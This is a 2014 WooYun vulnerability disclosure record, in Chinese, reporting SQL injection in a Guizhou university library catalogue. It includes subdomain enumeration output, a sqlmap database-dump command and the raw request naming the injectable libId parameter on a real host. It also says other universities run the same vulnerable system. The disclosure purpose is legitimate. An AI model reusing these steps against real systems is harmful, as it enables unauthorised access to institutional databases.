{"id": 51091, "wybug_id": "wooyun-2014-075742", "wybug_title": "贵州财经大学网站存在SQL注入", "wybug_corp": "贵州财经大学", "wybug_author": "spiderman", "wybug_date": "2014-09-11 11:29", "wybug_open_date": "2014-09-16 11:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 贵州财经大学图书馆子域名存在sql注入，可导致拖库 详细说明：  1. 用fierce查看贵州财经大学网站的子域名：fierce -dns gzife.edu.cn -thread 5 DNS Servers for gzife.edu.cn: dns.gzife.edu.cn Trying zone transfer first... Testing dns.gzife.edu.cn Request timed out or transfer not allowed. Unsuccessful in zone transfer (it was worth a shot) Okay, trying the good old fashioned way... brute force Checking for wildcard DNS... Nope. Good. Now performing 2280 test(s)... 58.16.80.230\tclient.gzife.edu.cn 210.40.80.33\tdns.gzife.edu.cn 59.108.227.55\tdc.gzife.edu.cn 58.16.80.235\thr.gzife.edu.cn 58.16.80.237\tim.gzife.edu.cn 58.16.80.236\ti.gzife.edu.cn 58.16.80.193 library.gzife.edu.cn 210.40.80.3\tmail.gzife.edu.cn 58.16.80.238\tnc.gzife.edu.cn 210.40.80.3\tpop.gzife.edu.cn 58.16.80.234\tportal.gzife.edu.cn 58.16.80.242\tsms.gzife.edu.cn 58.16.80.238\tsw.gzife.edu.cn 58.16.80.243\tvpn.gzife.edu.cn 58.16.80.234\twww.gzife.edu.cn 2. 打开图书馆子域名，看是否存在漏洞。发现可以根据关键词查找书籍\n\n3.查询后发现跳转到了一个新的域名，这个域名刚才使用firece没有发现：\n\n4.这个域名看来是通过图书馆的搜索功能跳转过来的，嫌疑比较大，然后找啊找，找到了一个sql注入的地方：\n\n   漏洞证明：  使用sqlmap进行拖库，sqlmap -r /root/my.txt -p \"libId\" --dbs其中my.txt的内容为：http://opac.gufe.edu.cn:8080/opac/getBibliographicByLibId?libId=1GET /opac/getBibliographicByLibId?libId=1 HTTP/1.1Host: opac.gufe.edu.cn:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestReferer: http://opac.gufe.edu.cn:8080/opac/newbook?tag=newbook&subtag=newbook_listContent-Length: 0Content-Type: text/plain; charset=UTF-8Cookie: JSESSIONID=8E2F20AC27EAB2464A4F58ECCB6496CBConnection: keep-alivePragma: no-cacheCache-Control: no-cache拖库结果如下：\n\n由于是使用sqlmap的time-based方法进行拖库，所以很慢，就ctr+c停止了，能证明拖库即可后来在google上搜索了下这个url，发现很多其他大学的图书馆系统也有使用这套检索系统，同样存在sql注入漏洞：\n\n\n\n\n\n   修复方案：  提供检索系统的应该是：北京金盘鹏图软件技术有限公司 让他们修改吧危害太大了，能秒很多的大学图书馆系统   版权声明：转载请注明来源 spiderman@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-16 11:30 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}